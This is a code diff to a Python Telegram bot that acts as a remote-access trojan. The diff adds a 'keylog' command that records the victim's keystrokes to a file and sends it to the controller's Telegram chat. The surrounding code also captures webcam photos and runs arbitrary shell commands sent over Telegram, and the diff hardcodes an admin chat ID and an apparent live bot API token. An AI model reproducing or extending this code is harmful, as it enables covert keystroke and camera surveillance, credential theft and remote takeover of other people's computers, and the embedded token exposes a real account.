@@ -6,8 +6,9 @@ from urllib import request as open_web
 import time, datetime
 import os
 import cv2
+from logger import *
 
-admin_chat_id = '' #chat_id of admin in int form
+admin_chat_id = '1144964888' #chat_id of admin in int form
 admin_name= "Nazeemuddin basha"
 
 file_found=False
@@ -38,7 +39,8 @@ now = datetime.datetime.now()
 authorized = 0
 aut_chat_id = 0
 pending = 0
-
+logging=False
+logger=0
 
 def test_message():
     i = 2
@@ -51,8 +53,9 @@ def test_message():
 
 
 def action(msg):
-    global auth_list, random, authorized, aut_chat_id, pending
+    global auth_list, random, authorized, aut_chat_id, pending,logging,logger
     print(auth_list)
+
     chat_id = msg['chat']['id']
     command = msg['text']
     first_name = msg['chat']['first_name']
@@ -89,13 +92,24 @@ def action(msg):
                 cv2.imwrite('photo.png',img)
                 telegram_bot.sendPhoto(chat_id,photo=open('photo.png','rb'))
                 os.remove('photo.png')
-
+            elif((list_command[0]=="keylog") | (list_command[0]=="Keylog")):
+                if not logging:
+                    logger = Listener( on_press=key_handeler )
+                    logger.start()
+                    telegram_bot.sendMessage(chat_id,"Key logger stared")
+                    logging=True
+                else:
+                    logger.stop()
+                    telegram_bot.sendMessage( chat_id, "Key logger stopped" )
+                    telegram_bot.sendDocument(chat_id,document=open("KeyLoger.txt","rb"))
+                    x= open("KeyLoger.txt","w")
+                    x.close()
+                    logging=False
             else:
                 message = Popen( command ,shell=True,stdout=PIPE,text=True).communicate()[0]
                 telegram_bot.sendMessage(chat_id, message)
 
         else:
-            #global random
             random = str(secrets.token_hex(6))
             print(random,type(random))
 
@@ -122,7 +136,7 @@ def action(msg):
         else:
             telegram_bot.sendMessage(chat_id, 'sorry invalid code')
 
-telegram_bot = telepot.Bot('api from botfather')
+telegram_bot = telepot.Bot('1871970969:AAEHhZvlOniMEm5S0Uxy-cnkKiMsZB4W7pE')
 test_message()
 print(telegram_bot.getMe())#for internal testing
 
